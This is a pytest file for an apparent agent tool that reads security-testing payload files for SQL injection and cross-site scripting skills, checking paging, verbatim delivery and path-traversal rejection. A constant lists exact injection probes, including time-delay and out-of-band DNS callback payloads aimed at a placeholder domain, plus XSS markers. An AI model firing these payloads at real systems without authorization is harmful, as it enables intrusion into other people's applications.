from __future__ import annotations

import json
from pathlib import Path

import pytest

from src.permission.permission import Decision, YoloPrompter
from src.skills.registry import Registry
from src.tools.skills.payloads import ReadPayloadsTool


REPO_ROOT = Path(__file__).resolve().parents[2]


class DummyInnerPrompter:

    async def ask(
        self,
        request,
        signal=None,
    ):
        return Decision.ALLOW_ONCE


@pytest.fixture
def noop_prompter():
    return YoloPrompter(
        DummyInnerPrompter(),
        True,
    )


@pytest.fixture
def skill_setup(tmp_path: Path):

    root = tmp_path / "skills"

    skill_dir = (
        root /
        "demo"
    )

    payload_dir = (
        skill_dir /
        "payloads"
    )

    (
        payload_dir /
        "sub"
    ).mkdir(
        parents=True
    )


    # SKILL.md
    (
        skill_dir /
        "SKILL.md"
    ).write_text(
        "---\n"
        "name: demo\n"
        "description: test skill\n"
        "allowed-tools: []\n"
        "---\n"
        "# body\n",
        encoding="utf-8",
    )


    # payload files

    (
        payload_dir /
        "alpha.txt"
    ).write_text(
        "one\ntwo\nthree\n",
        encoding="utf-8",
    )


    (
        payload_dir /
        "sub" /
        "beta.txt"
    ).write_text(
        "nested\nlines\n",
        encoding="utf-8",
    )


    registry = Registry()

    registry.load_dir(
        root
    )


    tool = ReadPayloadsTool(
        registry
    )


    return {
        "tool": tool,
        "skill_dir": skill_dir,
    }



@pytest.mark.asyncio
async def test_lists_payload_files_sorted(
    skill_setup,
    noop_prompter,
):

    tool = skill_setup["tool"]


    out = await tool.run(
        {
            "skill": "demo",
            "action": "list",
        },
        None,
        noop_prompter,
    )


    parsed = json.loads(
        out
    )


    assert "alpha.txt" in parsed
    assert "sub/beta.txt" in parsed

    assert parsed == sorted(parsed)



@pytest.mark.asyncio
async def test_reads_payload_file(
    skill_setup,
    noop_prompter,
):

    tool = skill_setup["tool"]


    out = await tool.run(
        {
            "skill": "demo",
            "file": "alpha.txt",
        },
        None,
        noop_prompter,
    )


    assert "demo/alpha.txt" in out
    assert "one" in out
    assert "three" in out



@pytest.mark.asyncio
async def test_rejects_path_escape(
    skill_setup,
    noop_prompter,
):

    tool = skill_setup["tool"]


    out = await tool.run(
        {
            "skill": "demo",
            "file": "../SKILL.md",
        },
        None,
        noop_prompter,
    )


    assert "escapes" in out.lower()



    out_abs = await tool.run(
        {
            "skill": "demo",
            "file": "/etc/passwd",
        },
        None,
        noop_prompter,
    )


    assert "escapes" in out_abs.lower()



@pytest.mark.asyncio
async def test_rejects_unknown_skill(
    skill_setup,
    noop_prompter,
):

    tool = skill_setup["tool"]


    out = await tool.run(
        {
            "skill": "no-such-skill",
            "action": "list",
        },
        None,
        noop_prompter,
    )


    assert "not loaded" in out



@pytest.mark.asyncio
async def test_handles_missing_payload_directory(
    tmp_path: Path,
    noop_prompter,
):

    root = (
        tmp_path /
        "skills"
    )


    skill_dir = (
        root /
        "bare"
    )


    skill_dir.mkdir(
        parents=True
    )


    (
        skill_dir /
        "SKILL.md"
    ).write_text(
        "---\n"
        "name: bare\n"
        "description: no payloads\n"
        "allowed-tools: []\n"
        "---\n"
        "# body\n",
        encoding="utf-8",
    )


    registry = Registry()

    registry.load_dir(
        root
    )


    tool = ReadPayloadsTool(
        registry
    )


    out = await tool.run(
        {
            "skill": "bare",
            "action": "list",
        },
        None,
        noop_prompter,
    )

    assert out == (
        'skill "bare" has no payload sources; '
        "expected payloads/ directory or payloads.txt file"
    )


@pytest.fixture(scope="module")
def shipped_payload_tool():
    registry = Registry()
    registry.load_dir(REPO_ROOT / "skills")
    return ReadPayloadsTool(registry)


@pytest.mark.asyncio
@pytest.mark.parametrize(
    "skill_name",
    [
        "sql-injection",
        "cross-site-scripting",
    ],
)
async def test_reads_top_level_payloads_from_shipped_skills(
    shipped_payload_tool,
    noop_prompter,
    skill_name,
):
    listed = await shipped_payload_tool.run(
        {
            "skill": skill_name,
            "action": "list",
        },
        None,
        noop_prompter,
    )
    assert json.loads(listed) == ["payloads.txt"]

    out = await shipped_payload_tool.run(
        {
            "skill": skill_name,
            "file": "payloads.txt",
        },
        None,
        noop_prompter,
    )

    assert f"# {skill_name}/payloads.txt" in out
    assert "PHASE 1" in out
    assert not out.startswith("error:")


@pytest.mark.asyncio
async def test_shipped_payload_reader_rejects_traversal(
    shipped_payload_tool,
    noop_prompter,
):
    out = await shipped_payload_tool.run(
        {
            "skill": "sql-injection",
            "file": "../SKILL.md",
        },
        None,
        noop_prompter,
    )

    assert out == 'error: path "../SKILL.md" escapes <skill>/payloads/'


async def test_boolean_examples_keep_context_annotations_in_bounded_reader(shipped_payload_tool, noop_prompter):
    args = {'skill': 'sql-injection', 'file': 'payloads.txt', 'limit': 150}
    pages = []
    for _ in range(3):
        page = str(await shipped_payload_tool.run(args, None, noop_prompter))
        pages.append(page)
        if "1' AND '1'='2" in page:
            break
        next_call = json.loads(page.splitlines()[0].split('Next page: ', 1)[1])
        assert next_call['tool'] == 'read_payloads'
        args = next_call['arguments']
    text = '\n'.join(pages)
    for rule in ('TRUE preserves the known benign marker before dependent FALSE',
                 'Being inside quotes is insufficient', 'prefix/suffix', 'parentheses',
                 'Equal empty/error responses are inconclusive', 'reassess the', 'context/oracle'):
        assert rule in text
    for expression in ('1 AND 1=1', '1 AND 1=2', "1' AND '1'='1", "1' AND '1'='2"):
        line = next(line for line in text.splitlines() if line.startswith(expression + ' '))
        assert '# purpose:' in line and 'applies:' in line and 'limit:' in line
        assert any(term in line for term in ('benign marker', 'its marker'))


# Exact shipped examples: availability and reader delivery, not executable inputs.
SHIPPED_EXAMPLES = {
    'sql-injection': (
        "'", '"', "')", '\")', '`', ';', '--', '%27',
        '1 AND 1=1', '1 AND 1=2', "1' AND '1'='1", "1' AND '1'='2", '1 OR 1=1',
        '1;SELECT SLEEP(5)--', '1;SELECT SLEEP(0)--',
        '1;SELECT pg_sleep(5)--', '1;SELECT pg_sleep(0)--',
        "1;WAITFOR DELAY '0:0:5'--", "1;WAITFOR DELAY '0:0:0'--",
        '1;BEGIN DBMS_LOCK.SLEEP(5); END;--', '1;BEGIN DBMS_LOCK.SLEEP(0); END;--',
        r"1;SELECT LOAD_FILE(CONCAT('\\\\',(SELECT '{TOKEN}'),'.{CALLBACK_DOMAIN}\\a'))--",
        r"1;EXEC master..xp_dirtree '\\{TOKEN}.{CALLBACK_DOMAIN}\a'--",
        "1 AND UTL_INADDR.get_host_address('{TOKEN}.{CALLBACK_DOMAIN}') IS NOT NULL--",
        '1 UNION SELECT version()--', '1 AND 1=CONVERT(int, @@version)--',
        "1' AND extractvalue(1, concat(0x7e, version()))--",
        '1 UNION SELECT banner FROM v$version--', '1 UNION SELECT sqlite_version()--',
    ),
    'cross-site-scripting': (
        'xsspoc{TIMESTAMP}', 'xsspoc{TIMESTAMP}"\'<>',
        "<script>document.title='xsspoc-{MARKER}'</script>",
        '<img src=x onerror="document.title=\'xsspoc-{MARKER}\'">',
        '\"><script>document.title=\'xsspoc-{MARKER}\'</script>',
        "'><script>document.title='xsspoc-{MARKER}'</script>",
        "';document.title='xsspoc-{MARKER}';//",
        '\";document.title=\'xsspoc-{MARKER}\';//',
        "javascript:document.title='xsspoc-{MARKER}'",
        "--><script>document.title='xsspoc-{MARKER}'</script><!--",
        'red;\"><script>document.title=\'xsspoc-{MARKER}\'</script><div style="',
        "color:red;}</style><script>document.title='xsspoc-{MARKER}'</script><style>{",
    ),
}


@pytest.mark.parametrize('skill_name', SHIPPED_EXAMPLES)
async def test_shipped_examples_and_exact_text_survive_bounded_continuation(
    shipped_payload_tool, noop_prompter, skill_name,
):
    raw = (REPO_ROOT / 'skills' / skill_name / 'payloads.txt').read_bytes().decode('utf-8')
    args = {'skill': skill_name, 'file': 'payloads.txt', 'limit': 23}
    parts = []
    offset = 0
    while True:
        output = await shipped_payload_tool.run(args, None, noop_prompter)
        rendered, metadata = output.rsplit('\nContinuation: ', 1)
        page = json.loads(metadata)
        assert page['start_char'] == offset
        assert page['end_char'] > offset
        body = rendered.split('\n', 1)[1][:page['end_char'] - offset]
        assert body == raw[offset:page['end_char']]  # never strip significant spaces
        parts.append(body)
        offset = page['end_char']
        if page['next_start_char'] is None:
            assert not output.truncated
            break
        assert output.truncated
        next_call = json.loads(rendered.splitlines()[0].split('Next page: ', 1)[1])
        assert next_call['tool'] == 'read_payloads'
        args = next_call['arguments']  # only producer-published identity and offsets
    delivered = ''.join(parts)
    assert len(parts) > 1 and delivered == raw
    for example in SHIPPED_EXAMPLES[skill_name]:
        assert any(line == example or line.startswith(example + '  ')
                   for line in delivered.splitlines()), repr(example)


@pytest.mark.parametrize('limit', [1, 5000])
async def test_reader_keeps_significant_spaces_encoding_and_placeholders_verbatim(
    skill_setup, noop_prompter, limit,
):
    from src.tools.skills.paths import MAX_PREVIEW_BYTES

    # Exercise line and byte clipping, including a Unicode split and trailing SQL space.
    raw = ('đ' * MAX_PREVIEW_BYTES + '\n1;SELECT SLEEP(5)-- \n'
           "'  # purpose: annotation kept as text\n%27\n%2527\n--<space>\n"
           'xsspoc{TIMESTAMP}\nxsspoc-{MARKER}\n{TOKEN}.{CALLBACK_DOMAIN}\n')
    (skill_setup['skill_dir'] / 'payloads' / 'alpha.txt').write_bytes(raw.encode('utf-8'))
    args = {'skill': 'demo', 'file': 'alpha.txt', 'limit': limit}
    parts = []
    while True:
        output = await skill_setup['tool'].run(args, None, noop_prompter)
        rendered, metadata = output.rsplit('\nContinuation: ', 1)
        page = json.loads(metadata)
        start, end = page['start_char'], page['end_char']
        assert end > start
        body = rendered.split('\n', 1)[1][:end - start]
        assert body == raw[start:end]
        assert len(body.encode('utf-8')) <= MAX_PREVIEW_BYTES
        parts.append(body)
        if page['next_start_char'] is None:
            break
        next_call = json.loads(rendered.splitlines()[0].split('Next page: ', 1)[1])
        args = next_call['arguments']
    assert ''.join(parts).encode('utf-8') == raw.encode('utf-8')
